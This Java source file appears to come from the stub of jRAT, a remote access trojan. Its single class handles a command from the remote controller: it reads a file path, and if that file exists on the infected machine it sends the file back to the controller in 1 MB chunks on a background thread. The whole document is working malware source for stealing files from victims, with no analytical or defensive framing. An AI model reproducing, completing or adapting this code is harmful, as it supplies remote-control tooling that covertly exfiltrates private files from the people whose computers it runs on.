package se.jrat.stub.packets.incoming;

import java.io.File;
import java.io.FileInputStream;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
import se.jrat.stub.packets.outgoing.Packet29ClientUploadPart;
import se.jrat.stub.packets.outgoing.Packet30BeginClientUpload;
import se.jrat.stub.packets.outgoing.Packet31CompleteClientUpload;


public class Packet21ClientUploadFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		final File file = new File(Connection.instance.readLine());

		if (file.exists() && file.isFile()) {
			Connection.instance.addToSendQueue(new Packet30BeginClientUpload(file));

			new Thread(new Runnable() {
				public void run() {
					try {

						FileInputStream fileInput = new FileInputStream(file);
						byte[] chunk = new byte[1024 * 1024];

						int read;
						while ((read = fileInput.read(chunk)) != -1) {
							AbstractOutgoingPacket packet = new Packet29ClientUploadPart(file, chunk, read);
							Connection.instance.addToSendQueue(packet);
						}
						fileInput.close();
						
						Connection.instance.addToSendQueue(new Packet31CompleteClientUpload(file));
					} catch (Exception ex) {
						ex.printStackTrace();
					}
				}
			}).start();
		}
	}

}
